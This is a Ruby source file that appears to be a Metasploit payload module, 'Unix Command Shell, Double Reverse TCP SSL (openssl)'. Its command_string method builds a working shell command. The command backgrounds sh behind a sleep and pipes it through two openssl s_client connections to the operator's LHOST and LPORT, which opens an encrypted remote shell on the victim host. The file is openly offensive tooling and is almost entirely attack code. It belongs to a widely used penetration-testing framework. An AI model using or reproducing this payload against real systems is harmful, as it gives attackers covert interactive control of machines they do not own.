##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp_double_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 182

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Double Reverse TCP SSL (openssl)',
      'Description'   => 'Creates an interactive shell through two inbound connections',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcpDoubleSSL,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'openssl',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd =
      "sh -c '(sleep #{3600+rand(1024)}|" +
      "openssl s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
      "while : ; do sh && break; done 2>&1|" +
      "openssl s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}" +
      " >/dev/null 2>&1 &)'"
    return cmd
  end
end
